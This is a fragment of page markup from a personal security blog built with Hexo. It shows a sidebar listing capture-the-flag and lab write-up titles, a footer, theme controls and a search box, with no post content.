href="/2021/10/31/general/DASCTF/" title="DASCTF">DASCTF</a><time datetime="2021-10-31T08:31:17.000Z" title="Created 2021-10-31 16:31:17">2021-10-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/31/general/%5BHTB%5DDT/" title="Docter"><img src="/img/fire.JPG" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Docter"/></a><div class="content"><a class="title" href="/2021/10/31/general/%5BHTB%5DDT/" title="Docter">Docter</a><time datetime="2021-10-31T08:31:17.000Z" title="Created 2021-10-31 16:31:17">2021-10-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/31/general/%5BQWB%5DHardXss/" title="HardXss复现"><img src="/img/fire.JPG" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HardXss复现"/></a><div class="content"><a class="title" href="/2021/10/31/general/%5BQWB%5DHardXss/" title="HardXss复现">HardXss复现</a><time datetime="2021-10-31T08:31:17.000Z" title="Created 2021-10-31 16:31:17">2021-10-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/31/general/VNctf2021wp/" title="Vnctf2021"><img src="/img/fire.JPG" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Vnctf2021"/></a><div class="content"><a class="title" href="/2021/10/31/general/VNctf2021wp/" title="Vnctf2021">Vnctf2021</a><time datetime="2021-10-31T08:31:17.000Z" title="Created 2021-10-31 16:31:17">2021-10-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/31/general/%5BHTB%5DLaboratory/" title="Laboratory"><img src="/img/fire.JPG" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Laboratory"/></a><div class="content"><a class="title" href="/2021/10/31/general/%5BHTB%5DLaboratory/" title="Laboratory">Laboratory</a><time datetime="2021-10-31T08:31:17.000Z" title="Created 2021-10-31 16:31:17">2021-10-31</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By f4l1k</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
